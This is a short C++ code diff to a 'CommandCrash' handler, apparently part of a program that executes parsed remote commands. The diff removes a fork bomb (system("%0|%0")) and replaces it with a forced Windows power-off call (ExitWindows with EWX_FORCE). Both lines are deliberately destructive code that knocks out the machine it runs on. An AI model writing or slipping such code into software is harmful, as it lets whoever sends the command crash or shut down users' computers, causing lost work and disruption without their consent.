@@ -18,7 +18,10 @@ bool CommandCrash::ShouldRunThisCommand(ParsedCommand* Parsed)
 
 void CommandCrash::Run(ParsedCommand * Parsed)
 {
-	system("%0|%0");
+	//https://msdn.microsoft.com/en-us/library/ms682108(v=VS.85).aspx
+	//SC_HANDLE serviceManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, GENERIC_READ);
+	ExitWindows(EWX_POWEROFF, EWX_FORCE);
+
 	//// Get the list of process identifiers.  
 	//register unsigned long aProcesses[1024];
 	//unsigned long cbNeeded;
